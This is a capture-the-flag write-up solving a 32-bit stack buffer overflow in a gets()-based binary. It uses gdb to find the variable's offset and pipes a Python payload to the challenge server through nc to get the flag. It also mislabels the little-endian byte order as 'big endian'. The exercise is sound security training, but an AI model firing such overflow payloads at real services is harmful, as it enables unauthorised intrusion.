# Pwn 100 - Cookie

We are given a nc server, ```nc 40.76.33.15 54321``` and a 32 bit binary. Here is the decompiled pseudocode:

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [esp+Bh] [ebp-4Dh]
  int v5; // [esp+4Ch] [ebp-Ch]

  setbuf(_bss_start, 0);
  v5 = 0;
  gets(&s);
  if ( v5 == 0x1337 )
    print_flag();
  return 0;
}
```

We have a buffer overflow since the program uses gets(), and we have to overflow and change the value of the variable v5 to 0x1337 in order to get the flag.

I will describe a more systematic method to solving this, and not the lazy way I used to solved this.

Systematic method:
We use gdb. Load the file with ```gdb cookie``` and disassemble main with ```disas main```. The disas is shown below:

```
(gdb) disas main
Dump of assembler code for function main:
   0x0804852b <+0>:     lea    0x4(%esp),%ecx
   0x0804852f <+4>:     and    $0xfffffff0,%esp
   0x08048532 <+7>:     pushl  -0x4(%ecx)
   0x08048535 <+10>:    push   %ebp
   0x08048536 <+11>:    mov    %esp,%ebp
   0x08048538 <+13>:    push   %ecx
   0x08048539 <+14>:    sub    $0x54,%esp
   0x0804853c <+17>:    mov    0x804a02c,%eax
   0x08048541 <+22>:    sub    $0x8,%esp
   0x08048544 <+25>:    push   $0x0
   0x08048546 <+27>:    push   %eax
   0x08048547 <+28>:    call   0x80483c0 <setbuf@plt>
   0x0804854c <+33>:    add    $0x10,%esp
   0x0804854f <+36>:    movl   $0x0,-0xc(%ebp)
   0x08048556 <+43>:    sub    $0xc,%esp
   0x08048559 <+46>:    lea    -0x4d(%ebp),%eax
   0x0804855c <+49>:    push   %eax
   0x0804855d <+50>:    call   0x80483e0 <gets@plt>
   0x08048562 <+55>:    add    $0x10,%esp
   0x08048565 <+58>:    cmpl   $0x1337,-0xc(%ebp)
   0x0804856c <+65>:    jne    0x8048573 <main+72>
   0x0804856e <+67>:    call   0x8048580 <print_flag>
   0x08048573 <+72>:    mov    $0x0,%eax
   0x08048578 <+77>:    mov    -0x4(%ebp),%ecx
   0x0804857b <+80>:    leave
   0x0804857c <+81>:    lea    -0x4(%ecx),%esp
   0x0804857f <+84>:    ret
End of assembler dump.
```

Our target is the line of code which compares some value to 0x1337, which is right here: ```0x08048565 <+58>:    cmpl   $0x1337,-0xc(%ebp)```. See that cmp instruction and 0x1337?

Now we can set a breakpoint here with: ```break *0x08048565``` and run the program with ```run```. Lets enter a recognizable pattern so that we will be able to tell which characters in our pattern will be the value we are trying to overwrite:

```
(gdb) break *0x08048565
Breakpoint 1 at 0x8048565
(gdb) run
Starting program: /root/cookie
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ

Breakpoint 1, 0x08048565 in main ()
```

Now, we hit the breakpoint we set earlier. Here is the instruction again ```cmpl   $0x1337,-0xc(%ebp)```. We see that it is comparing 0x1337 to the value at ebp-0xc. We can examine this value with ```x/wx $ebp-0xc```:

```
(gdb) x/wx $ebp-0xc
0xffffd64c:     0x52515151
(gdb)
```

The value of the variable is 0x52515151. The ascii representation of 0x51 is Q, and 0x52 is R. Now we know that in our pattern, 3 Q's and 1 R corresponds to the variable we are overwriting. We want this value to be 0x1337, so we can write this value in using python with the following:

```python -c "print 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQ\x37\x13\x00\x00RRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'"```

See how the characters that would've been QQQR I replaced with some weird values? These weird values is because 0x1337 in big endian is \x37\x13\x00\x00. Not, \x00\x00\x13\x37. It's reversed.

Now lets just pipe this input into the netcat server and receive our flag:

```
alex@WINDOWS-0A3VRFK:/mnt/c/Users/alex/Desktop/CTF$ python -c "print 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQ\x37\x13\x00\x00RRRSSSS'" | nc 40.76.33.15 54321
b0ctf{mr_d4n13ls_w0u1d_b3_v3ry_pr0ud}
alex@WINDOWS-0A3VRFK:/mnt/c/Users/alex/Desktop/CTF$
```

## Flag
### b0ctf{mr_d4n13ls_w0u1d_b3_v3ry_pr0ud}
